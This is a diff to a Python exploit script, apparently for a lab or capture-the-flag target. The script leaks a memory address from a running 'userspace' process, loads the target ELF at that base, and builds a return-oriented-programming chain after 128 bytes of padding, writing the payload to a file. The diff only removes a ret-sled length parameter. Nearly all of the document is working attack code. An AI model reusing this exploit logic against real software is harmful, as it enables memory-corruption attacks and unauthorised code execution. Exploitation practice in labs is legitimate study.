@@ -70,7 +70,7 @@ def leaked(start_leaker, search_for):
     leak = int(leak[-2], 16)
     return leak, leaker
 
-def build(leak, gadget_file, sled_length):
+def build(leak, gadget_file):
     # Load the target binary
     with open(gadget_file, 'rb') as i:
         binary = ELF.from_bytes(i.read(), vma=leak)
@@ -81,7 +81,7 @@ def build(leak, gadget_file, sled_length):
     rop.raw(0x7fffffffff00)
 
     # Put a nice lil ret seld on der
-    # for i in range(0, sled_length):
+    # for i in range(0):
     #     # ret;
     #     rop.raw(adjuster(leak + 0x01ea33))
 
@@ -147,35 +147,34 @@ def build(leak, gadget_file, sled_length):
     # Put 132 bytes of whatever
     return b'A'*128 + bytes(rop)
 
-def create_exploit(target_binary, payload_file, sled_length, leak):
-    exploit = build(leak, target_binary, sled_length)
+def create_exploit(target_binary, payload_file, leak):
+    exploit = build(leak, target_binary)
     with open(payload_file, 'wb') as o:
         o.write(exploit)
     return exploit
 
-def attack(target_binary, payload_file, sled_length):
+def attack(target_binary, payload_file):
     leak, leaker = leaked(['./userspace', target_binary, payload_file],
             target_binary)
     print('Leaked address is', str(hex(leak)))
-    exploit = create_exploit(target_binary, payload_file, sled_length, leak)
+    exploit = create_exploit(target_binary, payload_file, leak)
     leaker.shutdown('send')
     leaker.shutdown()
 
 def main():
     # Make sure we have enough args
-    if len(sys.argv) < 4:
-        print('Usage %s target_binary, payload_file, sled_length [leak]'.format(sys.argv[1]))
+    if len(sys.argv) < 3:
+        print('Usage %s target_binary, payload_file [leak]'.format(sys.argv[1]))
         sys.exit(1)
     # Set the common variables
     target_binary = sys.argv[1]
     payload_file = sys.argv[2]
-    sled_length = int(sys.argv[3])
     # Choose what to do baised on number of vars given
-    if len(sys.argv) == 4:
-        attack(target_binary, payload_file, sled_length)
+    if len(sys.argv) == 3:
+        attack(target_binary, payload_file)
     else:
-        leak = int(sys.argv[4], 16)
-        create_exploit(target_binary, payload_file, sled_length, leak)
+        leak = int(sys.argv[3], 16)
+        create_exploit(target_binary, payload_file, leak)
 
 if __name__ == '__main__':
     main()
